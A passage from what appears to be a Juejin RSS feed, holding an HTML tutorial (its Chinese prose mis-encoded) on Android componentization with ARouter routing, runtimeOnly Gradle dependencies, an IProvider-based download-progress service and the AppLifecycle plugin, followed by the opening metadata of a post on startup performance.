                <span class="hljs-variable language_">arguments</span> = [ moduleName : project.<span class="hljs-title function_">getName</span>() ]
            }
        }
    }
}

dependencies {
    <span class="hljs-comment">//ä½¿ç”¨ARouterçš„æ¨¡å—éœ€æ·»åŠ è¿™ä¸ªä¾èµ–</span>
    annotationProcessor <span class="hljs-string">'com.alibaba:arouter-compiler:1.1.4'</span>
}
</code></pre>
<p>åœ¨DownloadActivityä¸Šæ·»åŠ æ³¨è§£ <code>@Route(path = "/download/DownloadActivity")</code> ï¼Œè·¯å¾„æ³¨æ„è‡³å°‘éœ€è¦æœ‰ä¸¤çº§ï¼Œå‰é¢çš„ download å¯¹åº”æ¨¡å—åï¼Œä¸ build.gradle ä¸­é…ç½®çš„ moduleName å¯¹åº”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Route(path = "/download/DownloadActivity")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        setContentView(R.layout.activity_download);
        ...
    }
} 
</code></pre>
<p>ä» HomeFragment è·³è½¬åˆ° DownloadActivity éœ€è°ƒç”¨ä½¿ç”¨ ARouter è¿›è¡Œè·³è½¬ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HomeFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> {

    <span class="hljs-meta">@Nullable</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> View <span class="hljs-title function_">onCreateView</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> LayoutInflater inflater, <span class="hljs-meta">@Nullable</span> ViewGroup container, <span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> {
        <span class="hljs-type">View</span> <span class="hljs-variable">view</span> <span class="hljs-operator">=</span> inflater.inflate(R.layout.fragment_home, container, <span class="hljs-literal">false</span>);
        <span class="hljs-keyword">return</span> view;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onViewCreated</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> View view, <span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onViewCreated(view, savedInstanceState);
        ...
        <span class="hljs-type">Button</span> <span class="hljs-variable">btnDownload</span> <span class="hljs-operator">=</span> view.findViewById(R.id.btn_download);
        btnDownload.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-title class_">View</span>.OnClickListener() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> {
                <span class="hljs-comment">// ä½¿ç”¨ ARouter è¿›è¡Œè·³è½¬</span>
                ARouter.getInstance()
                        .build(<span class="hljs-string">"/download/DownloadActivity"</span>)
                        .navigation();
            }
        });
        ...
    }
}
</code></pre>
<p>æ­¤æ—¶è¿˜æ— æ³•è·³è½¬æˆåŠŸï¼Œè¦åœ¨ app æ¨¡å—çš„ Application ä¸­åˆå§‹åŒ– ARouter :</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onCreate();
        <span class="hljs-keyword">if</span>(BuildConfig.DEBUG){
            ARouter.openLog();
            ARouter.openDebug();
        }
        ARouter.init(<span class="hljs-built_in">this</span>);
        ...
    }
} 
</code></pre>
<p>ç”±äºç»„ä»¶é—´ä¸èƒ½æœ‰ä¾èµ–ï¼Œ home ç»„ä»¶ä¸èƒ½ä¾èµ– download ç»„ä»¶ï¼Œä½†æ˜¯ home ç»„ä»¶å’Œ download ç»„ä»¶éƒ½éœ€è¦å‚ä¸ç¼–è¯‘ï¼Œå¦åˆ™ä¸èƒ½ç”Ÿæˆè·¯ç”±ï¼Œå¯ä»¥è®© app æ¨¡å—ä¾èµ– home æ¨¡å—å’Œ download æ¨¡å—æ¥å®Œæˆç¼–è¯‘ã€‚è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ Gradle 3.0 æ–°æä¾›çš„ä¾èµ–æ–¹å¼ runtimeOnly ï¼Œé€šè¿‡ runtimeOnly æ–¹å¼ä¾èµ–æ—¶ï¼Œä¾èµ–é¡¹ä»…åœ¨è¿è¡Œæ—¶å¯è§ï¼Œç¼–è¯‘æœŸé—´ä¾èµ–é¡¹çš„ä»£ç æ˜¯å®Œå…¨éš”ç¦»çš„ï¼Œåˆ™ app æ¨¡å—çš„ build.gradle é…ç½®å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">dependencies {
    runtimeOnly <span class="hljs-title function_">project</span><span class="hljs-params">(<span class="hljs-string">':home'</span>)</span>
    runtimeOnly <span class="hljs-title function_">project</span><span class="hljs-params">(<span class="hljs-string">":download"</span>)</span>
    runtimeOnly <span class="hljs-title function_">project</span><span class="hljs-params">(<span class="hljs-string">":game"</span>)</span>
    implementation <span class="hljs-title function_">project</span><span class="hljs-params">(<span class="hljs-string">":base"</span>)</span>
}
</code></pre>
<p>è¿™æ ·åœ¨ç¼–è¯‘æœŸï¼Œ app æ¨¡å—ä¸ home æ¨¡å—ã€ download æ¨¡å—ã€ game æ¨¡å—éƒ½æ˜¯äº’ç›¸éš”ç¦»çš„ï¼Œé‚£ä¹ˆåœ¨ app æ¨¡å—ä¸­çš„ HomeActivity ä¸­å’Œæ€ä¹ˆæ‹¿åˆ° home æ¨¡å—ä¸­çš„ HomeFragment å’Œ game æ¨¡å—ä¸­çš„ GameFragment ï¼Œå®ç°è¿™ä¸¤ä¸ª Fragment çš„åˆ‡æ¢å‘¢ï¼Ÿç­”æ¡ˆè¿˜æ˜¯ä½¿ç”¨ ARouter ï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HomeActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AppCompatActivity</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RadioGroup</span>.OnCheckedChangeListener {

    Fragment mHomeTabFragment;

    Fragment mGameTabFragment;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);
        setContentView(R.layout.activity_home);

        <span class="hljs-type">RadioGroup</span> <span class="hljs-variable">rg_tab</span> <span class="hljs-operator">=</span> findViewById(R.id.tabs);
        rg_tab.setOnCheckedChangeListener(<span class="hljs-built_in">this</span>);

        initDefaultFragment();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCheckedChanged</span><span class="hljs-params">(RadioGroup group, <span class="hljs-type">int</span> checkedId)</span> {
        hideAllFragments();
        <span class="hljs-keyword">switch</span> (checkedId) {
            <span class="hljs-keyword">case</span> R.id.main_tab_home:
                replaceFragment(<span class="hljs-number">0</span>);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> R.id.main_tab_game:
                replaceFragment(<span class="hljs-number">1</span>);
                <span class="hljs-keyword">break</span>;
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initDefaultFragment</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (mHomeTabFragment == <span class="hljs-literal">null</span>) {
            mHomeTabFragment = (Fragment) ARouter.getInstance().build(<span class="hljs-string">"/home/homeFragment"</span>).navigation();
        }
        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getSupportFragmentManager().beginTransaction();
        transaction.replace(R.id.container_fragment, mHomeTabFragment, <span class="hljs-string">"home"</span>);
        transaction.commit();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">replaceFragment</span><span class="hljs-params">(<span class="hljs-type">int</span> position)</span> {
        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getSupportFragmentManager().beginTransaction();
        <span class="hljs-keyword">switch</span> (position) {
            <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:
                <span class="hljs-keyword">if</span> (mHomeTabFragment == <span class="hljs-literal">null</span>) {
                    mHomeTabFragment = (Fragment) ARouter.getInstance().build(<span class="hljs-string">"/home/homeFragment"</span>).navigation();
                    transaction.add(R.id.container_fragment, mHomeTabFragment, <span class="hljs-string">"home"</span>);
                }
                transaction.show(mHomeTabFragment);
                <span class="hljs-keyword">break</span>;
            <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
                <span class="hljs-keyword">if</span> (mGameTabFragment == <span class="hljs-literal">null</span>) {
                    mGameTabFragment = (Fragment) ARouter.getInstance().build(<span class="hljs-string">"/game/gameFragment"</span>).navigation();
                    transaction.add(R.id.container_fragment, mGameTabFragment, <span class="hljs-string">"game"</span>);
                }
                transaction.show(mGameTabFragment);
                <span class="hljs-keyword">break</span>;
        }
        transaction.commitAllowingStateLoss();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">hideAllFragments</span><span class="hljs-params">()</span> {
        <span class="hljs-type">FragmentTransaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getSupportFragmentManager().beginTransaction();
        <span class="hljs-keyword">if</span> (mHomeTabFragment != <span class="hljs-literal">null</span>) {
            transaction.hide(mHomeTabFragment);
        }
        <span class="hljs-keyword">if</span> (mGameTabFragment != <span class="hljs-literal">null</span>) {
            transaction.hide(mGameTabFragment);
        }
        transaction.commitAllowingStateLoss();
    }
}
</code></pre>
<h4 data-id="heading-5">ç»„ä»¶é—´é€šä¿¡</h4>
<p>æœ‰æ—¶å€™ç»„ä»¶ä¹‹é—´æ²¡æœ‰åŠæ³•åšåˆ°å®Œå…¨éš”ç¦»ï¼Œæ¯”å¦‚ï¼Œhome ç»„ä»¶çš„ HomeFragment ä¸­éœ€è¦æ˜¾ç¤ºæŸä¸€ä¸ªåº”ç”¨çš„ä¸‹è½½è¿›åº¦ï¼Œ home ç»„ä»¶ä¸ download ç»„ä»¶ä¹‹é—´æ²¡æœ‰ä¾èµ–å…³ç³»ï¼Œé‚£ä¹ˆå®ƒä»¬ä¹‹é—´å¦‚ä½•é€šä¿¡å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ä» download æ¨¡å—ä¸­æ‹†åˆ†å‡ºä¸€ä¸ªæš´éœ²çš„æ¨¡å—ï¼šexport_downloadï¼Œé‡Œé¢æä¾›æ¥å£ç»™ home ç»„ä»¶ä½¿ç”¨ã€‚</p>
<p>å¹³æ—¶å¼€å‘ä¸­æˆ‘ä»¬å¸¸ç”¨æ¥å£è¿›è¡Œè§£è€¦ï¼Œä¸éœ€è¦å…³å¿ƒæ¥å£çš„å…·ä½“å®ç°ï¼Œé¿å…æ¥å£è°ƒç”¨ä¸ä¸šåŠ¡é€»è¾‘å®ç°ä¹‹é—´ç´§å¯†å…³è”ï¼Œè¿™é‡Œç»„ä»¶é—´çš„é€šä¿¡ä¹Ÿæ˜¯é‡‡ç”¨ç›¸åŒçš„æ€è·¯ã€‚</p>
<p>æˆ‘ä»¬æ–°å»ºä¸€ä¸ª library æ¨¡å—ï¼šexport_download ï¼Œ home æ¨¡å—å’Œ download æ¨¡å—éƒ½ä¾èµ– export_download æ¨¡å—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åœ¨ home æ¨¡å—å’Œ download æ¨¡å—çš„ build.grale ä¸­æ·»åŠ </span>
dependencies {
    implementation <span class="hljs-title function_">project</span><span class="hljs-params">(<span class="hljs-string">":export_download"</span>)</span>
}
</code></pre>
<p>åœ¨ export_download æ¨¡å—ä¸­æ·»åŠ  IDownloadService ç»§æ‰¿ IProvider ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IDownloadService</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">IProvider</span> {
    <span class="hljs-type">int</span> <span class="hljs-title function_">getDownloadProgress</span><span class="hljs-params">(String name)</span>;
}
</code></pre>
<p>download æ¨¡å—ä¸­æœ‰å¯¹è¿™ä¸ªæ¥å£çš„å…·ä½“å®ç°ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Route(path = "/download/service")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownloadServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IDownloadService</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getDownloadProgress</span><span class="hljs-params">(String name)</span> {
        Map&lt;String, Integer&gt; progressMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        progressMap.put(<span class="hljs-string">"tiktok"</span>, <span class="hljs-number">47</span>);
        progressMap.put(<span class="hljs-string">"weibo"</span>, <span class="hljs-number">89</span>);
        <span class="hljs-keyword">return</span> progressMap.get(name);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(Context context)</span> {

    }
}
</code></pre>
<p>è¿™æ ·ï¼Œåœ¨é›†æˆè°ƒè¯•æ¨¡å¼ä¸‹ï¼Œhome æ¨¡å—ä¸­çš„ HomeFragment å¯ä»¥é€šè¿‡ ARouter æ¥è·å–å…¶ä¸­æŸä¸ªåº”ç”¨çš„ä¸‹è½½è¿›åº¦ï¼Œè¿™æ ·å°±å®ç°äº†ç»„ä»¶é—´çš„é€šä¿¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Route(path = "/home/homeFragment")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HomeFragment</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Fragment</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onViewCreated</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> View view, <span class="hljs-meta">@Nullable</span> Bundle savedInstanceState)</span> {
        <span class="hljs-built_in">super</span>.onViewCreated(view, savedInstanceState);

        <span class="hljs-type">TextView</span> <span class="hljs-variable">tv1</span> <span class="hljs-operator">=</span> view.findViewById(R.id.tv1);
        <span class="hljs-type">IDownloadService</span> <span class="hljs-variable">downloadService</span> <span class="hljs-operator">=</span> (IDownloadService) ARouter.getInstance().build(<span class="hljs-string">"/download/service"</span>).navigation();
        tv1.setText(<span class="hljs-string">"Weibo:"</span> + downloadService.getDownloadProgress(<span class="hljs-string">"weibo"</span>) + <span class="hljs-string">"%"</span>);
    }

}
</code></pre>
<h4 data-id="heading-6">Applicaiton çš„ç”Ÿå‘½å‘¨æœŸåˆ†å‘</h4>
<p>æˆ‘ä»¬é€šå¸¸ä¼šåœ¨ app æ¨¡å—çš„ Application çš„ onCreate() æ–¹æ³•ä¸­åšä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œè€Œä¸šåŠ¡ç»„ä»¶æœ‰æ—¶ä¹Ÿéœ€è¦æ‰§è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œä½ å¯èƒ½ä¼šè¯´ï¼Œç›´æ¥ä¸€è‚¡è„‘éƒ½åœ¨ app æ¨¡å—çš„ Application ä¸­åˆå§‹åŒ–ä¸å°±è¡Œäº†å—ï¼Œä½†æ˜¯è¿™æ ·åšä¼šå¸¦æ¥é—®é¢˜ï¼Œå› ä¸ºæˆ‘ä»¬å¸Œæœ› app æ¨¡å—ä¸ä¸šåŠ¡ç»„ä»¶ä¹‹é—´çš„ä»£ç æ˜¯éš”ç¦»ï¼Œå¹¶ä¸”æˆ‘ä»¬å¸Œæœ›ç»„ä»¶å†…éƒ¨çš„ä»»åŠ¡è¦åœ¨ç»„ä»¶å†…éƒ¨åˆå§‹åŒ–ã€‚</p>
<p>è¿™é‡Œä½¿ç”¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhufeiyang%2FAndroid-AppLifecycleMgr" title="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fhufeiyang%2FAndroid-AppLifecycleMgr" target="_blank"><strong>AppLifeCycleæ’ä»¶</strong></a> ï¼Œå®ƒå¯ä»¥è®©ä¸šåŠ¡ç»„ä»¶æ— ä¾µå…¥åœ°è·å– Application ç”Ÿå‘½å‘¨æœŸï¼Œå®ƒä¸“é—¨ç”¨åœ¨ç»„ä»¶åŒ–å¼€å‘ä¸­ï¼Œä½¿ç”¨å app æ¨¡å—çš„ Application çš„ç”Ÿå‘½å‘¨æœŸä¼šä¸»åŠ¨åˆ†å‘ç»™ä¸šåŠ¡ç»„ä»¶ï¼Œå…·ä½“ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼š<br/></p>
<ol>
<li>åœ¨é¡¹ç›®çš„ build.gradle ä¸­æ·»åŠ  applifecycle æ’ä»¶ä»“ï¼š</li>
</ol>
<pre><code class="hljs language-rust" lang="rust">buildscript {
    repositories {
        <span class="hljs-title function_ invoke__">google</span>()
        <span class="hljs-title function_ invoke__">jcenter</span>()

        <span class="hljs-comment">// applifecycle æ’ä»¶ä»“ä¹Ÿæ˜¯ jitpack</span>
        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//jitpack.io' }</span>
    }
    dependencies {
        classpath <span class="hljs-symbol">'com</span>.android.tools.build:gradle:<span class="hljs-number">4.2</span>.<span class="hljs-number">2</span>'

        <span class="hljs-comment">// åŠ è½½æ’ä»¶ applifecycle</span>
        classpath <span class="hljs-symbol">'com</span>.github.hufeiyang.Android-AppLifecycleMgr:applifecycle-plugin:<span class="hljs-number">1.0</span>.<span class="hljs-number">3</span>' }
}

allprojects {
    repositories {
        <span class="hljs-title function_ invoke__">google</span>()
        <span class="hljs-title function_ invoke__">jcenter</span>()

        maven { url <span class="hljs-symbol">'https</span>:<span class="hljs-comment">//jitpack.io' }</span>
    }
}
</code></pre>
<ol start="2">
<li>åœ¨ app çš„ build.grale ä¸­æ·»åŠ ï¼š</li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// æ·»åŠ ä½¿ç”¨æ’ä»¶ applifecycle</span>
apply plugin: <span class="hljs-string">'com.hm.plugin.lifecycle'</span>
</code></pre>
<ol start="3">
<li>åœ¨ base æ¨¡å—ä¸­æ·»åŠ ä¾èµ–ï¼š</li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// base æ¨¡å—çš„ build.grale</span>
dependencies {
    api <span class="hljs-string">'com.github.hufeiyang.Android-AppLifecycleMgr:applifecycle-api:1.0.4'</span>
}
</code></pre>
<ol start="4">
<li>åœ¨ä¸šåŠ¡ç»„ä»¶ä¸­æ·»åŠ ä¾èµ–ï¼š</li>
</ol>
<pre><code class="hljs language-arduino" lang="arduino">dependencies { 
    annotationProcessor <span class="hljs-string">'com.github.hufeiyang.Android-AppLifecycleMgr:applifecycle-compiler:1.0.4'</span>
}
</code></pre>
<ol start="5">
<li>Sync Projectåï¼Œåœ¨ä¸šåŠ¡ç»„ä»¶ä¸­æ–°å»ºç±»å®ç° IApplicationLifecycleCallbacks æ¥å£å¹¶æ·»åŠ  <code>@AppLifecycle</code> æ³¨è§£ï¼Œç”¨äºæ¥æ”¶ Application ç”Ÿå‘½å‘¨æœŸçš„åˆ†å‘ï¼Œå¦‚ download æ¨¡å—æ–°å»ºç±»å¦‚ä¸‹ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@AppLifecycle</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HomeAppLifecycleCallbacks</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IApplicationLifecycleCallbacks</span> {


    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getPriority</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Context context)</span> {
        Log.i(<span class="hljs-string">"HomeApp"</span>, <span class="hljs-string">"onCreate"</span>);
        <span class="hljs-comment">//å¯åœ¨æ­¤å¤„åšæ¨¡å—å†…ä»»åŠ¡çš„åˆå§‹åŒ–</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onTerminate</span><span class="hljs-params">()</span> {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLowMemory</span><span class="hljs-params">()</span> {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onTrimMemory</span><span class="hljs-params">(<span class="hljs-type">int</span> level)</span> {

    }
}
</code></pre>
<p>å®ç°çš„æ–¹æ³•æœ‰ onCreate() ã€ onTerminate() ã€ onLowMemory() ã€ onTrimMemory() ã€ getPriority() ï¼Œå…¶ä¸­æœ€é‡è¦çš„æ˜¯ onCreate() æ–¹æ³•ï¼Œå¯åœ¨æ­¤å¤„åšæ¨¡å—å†…ä»»åŠ¡çš„åˆå§‹åŒ–ã€‚è¿˜å¯ä»¥é€šè¿‡ getPriority() æ–¹æ³•è®¾ç½®å¤šä¸ªæ¨¡å—ä¸­ onCreate() æ–¹æ³•è°ƒç”¨çš„ä¼˜å…ˆé¡ºåºã€‚</p>
<ol start="6">
<li>åœ¨ app çš„ Application ä¸­è§¦å‘ç”Ÿå‘½å‘¨æœŸçš„åˆ†å‘ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">App</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span> {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onCreate();
        Log.i(<span class="hljs-string">"App"</span>, <span class="hljs-string">"onCreate"</span>);
        ...
        ApplicationLifecycleManager.init();
        ApplicationLifecycleManager.onCreate(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onTerminate</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onTerminate();

        ApplicationLifecycleManager.onTerminate();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLowMemory</span><span class="hljs-params">()</span> {
        <span class="hljs-built_in">super</span>.onLowMemory();

        ApplicationLifecycleManager.onLowMemory();
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onTrimMemory</span><span class="hljs-params">(<span class="hljs-type">int</span> level)</span> {
        <span class="hljs-built_in">super</span>.onTrimMemory(level);

        ApplicationLifecycleManager.onTrimMemory(level);
    }

}
</code></pre>
<p>App è¿è¡Œåé€šè¿‡æ‰“å°å¯ä»¥çœ‹åˆ° HomeAppLifecycleCallbacks çš„ onCreate() æ–¹æ³•ä¹Ÿä¼šéšä¹‹æ‰§è¡Œã€‚</p>
<p>HomeAppLifecycleCallbacks ç”¨äºé›†æˆè°ƒè¯•ä¸­ï¼Œæ¨¡å—ç‹¬ç«‹è°ƒè¯•å¯ä»¥è‡ªå·±æ–°å»ºä¸€ä¸ª HomeApp æ¥æ‰§è¡Œç‹¬ç«‹è°ƒè¯•è¿è¡Œéœ€è¦çš„åˆå§‹åŒ–æ“ä½œã€‚</p>
<p>å®ç°ç»„ä»¶åŒ–åï¼Œå„æ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
<img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/bee5dc62894f45cfb84c5c4198a79417~tplv-k3u1fbpfcp-jj-mark:3024:0:0:0:q75.awebp#?w=914&amp;h=926&amp;s=108926&amp;e=png&amp;b=fefefe" alt="image.png" width="70%" loading="lazy"/>
<p>app æ¨¡å—ä¾èµ–æ‰€æœ‰çš„ä¸šåŠ¡æ¨¡å—ï¼Œæ‰€æœ‰æ¶‰åŠåˆ°ä¸‹è½½çš„æ¨¡å—éƒ½éœ€è¦ä¾èµ– export_download æ¨¡å—ï¼Œè¿˜æœ‰ï¼Œæ‰€æœ‰æ¨¡å—éƒ½éœ€è¦ä¾èµ– base æ¨¡å—ã€‚è¿™é‡Œæ‰€æœ‰æ¨¡å—é—´çš„ä¾èµ–å…³ç³»éƒ½ä¸ä½¿ç”¨ api ä¼ é€’ä¾èµ–ï¼Œè¿™æ ·åšæ˜¯ä¸ºäº†åç»­ä¾èµ–çš„çµæ´»é…ç½®ã€‚åç»­å¯ä»¥æŠŠå„ä¸ªæ¨¡å—ç¼–è¯‘ç”Ÿæˆçš„ aar åŒ…éƒ½ä¸Šä¼ åˆ° maven ä»“åº“ï¼Œè¿™æ ·å¯ä»¥åƒä¾èµ–æ™®é€šæ’ä»¶ä¸€æ ·é…ç½®ä¾èµ–çš„æ¨¡å—ï¼Œè¿™æ ·åšè¿˜æœ‰ä¸€ä¸ªå¥½å¤„ï¼Œåˆ«çš„æ¨¡å—çš„å¼€å‘äººå‘˜æ²¡æœ‰åŠæ³•è½»æ˜“ä¿®æ”¹ä½ è´Ÿè´£çš„æ¨¡å—çš„ä»£ç äº†ã€‚</p>
<p>Demoåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FEnzoXRay%2FMyComponent" target="_blank" title="https://github.com/EnzoXRay/MyComponent" ref="nofollow noopener noreferrer">github.com/EnzoXRay/Myâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç¨³å®šæ€§æ€§èƒ½ç³»åˆ—ä¹‹ä¹â€”â€”å¯åŠ¨æ€§èƒ½ä¼˜åŒ–:Bootã€å†·å¯åŠ¨ä¸çƒ­å¯åŠ¨]]></title>    <link>https://juejin.cn/post/7592432859862974498</link>    <guid>https://juejin.cn/post/7592432859862974498</guid>    <pubDate>2026-01-07T14:15:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592432859862974498" data-draft-id="7592276645362089984" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç¨³å®šæ€§æ€§èƒ½ç³»åˆ—ä¹‹ä¹â€”â€”å¯åŠ¨æ€§èƒ½ä¼˜åŒ–:Bootã€å†·å¯åŠ¨ä¸çƒ­å¯åŠ¨"/> <meta itemprop="keywords" content="Android,Debug,æ€§èƒ½ä¼˜åŒ–"/> <meta itemprop="datePublished" content="2026-01-07T14:15:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
